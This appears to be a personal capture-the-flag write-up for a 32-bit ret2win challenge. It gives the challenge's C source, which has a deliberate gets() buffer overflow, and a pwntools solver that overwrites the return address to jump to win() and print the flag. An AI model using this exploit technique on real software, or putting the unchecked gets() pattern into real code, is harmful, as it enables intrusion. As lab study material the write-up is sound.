## Source code ( Full )
``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "CodeBank/asm.h"

#define BUFSIZE 38
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("CodeBank/flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "You may not have plenty of time",
                    "to solve the challenge.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
>[!note]- Explanation
> - `gets(buf)` → no length check → buffer overflow → overwrite return address  
> - code selalu sama ketika reset new file (ret2win → ada `win()` target)  
> - Yang berubah cuma `BUFSIZE` → tinggal adjust offset exploit  


>[!note]- how to get win() addr
> - `win()` address can be taken either:  
> - directly from pwntools (`elf.sym['win']`)  
> - or manually with gdb  
> - ![[Screenshot 2026-03-19 065601.png]]
> - Since this is **32-bit**, use `p32(win)`
## Solver.py

``` python
from pwn import *

elf = ELF('./17')  
p = process('./17')

win = elf.sym['win']
offset = 0x61 + 4  

payload = b"A"*offset + p32(win)

p.sendline(payload)
p.interactive()
```

>[!note]- Explanation
> - `ELF('./17')` → load binary buat ambil symbol (kayak `win`)  
> - `process('./17')` → jalanin binary locally  
> - `win = elf.sym['win']` → ambil alamat fungsi `win()` (target exploit)  
> - `offset = 0x61 + 4` → ukuran buffer + padding sampai return address  
> - `payload = b"A"*offset + p32(win)`  
>   → isi buffer pakai junk, lalu overwrite return address ke `win()`  
> - `p.sendline(payload)` → kirim payload ke program  
> - `p.interactive()` → dapetin output (flag)
